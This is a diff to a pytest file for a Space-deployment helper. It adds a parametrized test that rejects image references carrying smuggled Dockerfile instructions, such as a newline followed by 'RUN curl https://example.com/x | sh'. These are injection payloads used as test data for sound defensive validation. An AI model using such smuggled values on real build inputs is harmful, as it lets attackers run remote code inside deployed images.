@@ -17,8 +17,26 @@ def test_space_dockerfile_is_pinned_to_the_deployed_image(tmp_path):
 
 
 def test_refuses_an_untagged_image(tmp_path):
-    with pytest.raises(ValueError, match="no tag"):
+    with pytest.raises(ValueError, match="not a tagged image reference"):
         render_space_files("ghcr.io/owner/breast-cancer-classification", tmp_path)
+
+
+@pytest.mark.parametrize(
+    "image",
+    [
+        "ghcr.io/owner/app:abc\nRUN curl https://example.com/x | sh",
+        "ghcr.io/owner/app:abc RUN id",
+        "ghcr.io/owner/app:",
+        "GHCR.io/Owner/app:abc",
+        "",
+    ],
+)
+def test_refuses_anything_but_a_plain_tagged_reference(tmp_path, image):
+    # The value lands in the Space's Dockerfile, so a newline or space would
+    # let a caller append instructions to the deployed image.
+    with pytest.raises(ValueError):
+        render_space_files(image, tmp_path)
+    assert not (tmp_path / "Dockerfile").exists()
 
 
 def test_space_routes_traffic_to_the_port_the_app_listens_on():
